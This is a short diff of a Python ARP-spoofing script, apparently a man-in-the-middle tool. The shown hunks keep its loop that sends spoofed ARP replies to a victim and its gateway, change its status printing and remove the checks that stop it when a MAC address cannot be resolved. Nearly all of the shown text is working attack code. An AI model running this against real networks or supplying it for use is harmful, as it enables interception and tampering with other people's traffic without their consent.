@@ -43,7 +43,7 @@ def spoof_arp(target_ip, spoof_ip):
     send(packet, verbose=False)
     packet_count += 1
 
-    print(f"[*] Sent spoofed ARP packet to {target_ip}, spoofing as {spoof_ip}. Total packets sent: {packet_count}")
+    print(f"[*] Sent spoofed ARP packet to {target_ip}, spoofing as {spoof_ip}. Total packets sent: {packet_count}", end="")
     return True
 
 def restore_arp(destination_ip, source_ip):
@@ -64,19 +64,12 @@ if __name__ == "__main__":
     victim_ip = args.target
     gateway_ip = args.gateway
 
-    if get_mac(victim_ip) is None:
-        print("[!] Could not resolve victim MAC address. Exiting.")
-        sys.exit(1)
-
-    if get_mac(gateway_ip) is None:
-        print("[!] Could not resolve gateway MAC address. Exiting.")
-        sys.exit(1)
-
     try:
         while True:
             success1 = spoof_arp(target_ip=gateway_ip, spoof_ip=victim_ip)
             success2 = spoof_arp(target_ip=victim_ip, spoof_ip=gateway_ip)
-
+            sys.stdout.flush()
+            
             if not (success1 and success2):
                 print("[!] Some spoof packets failed to send due to MAC resolution failures.")
 
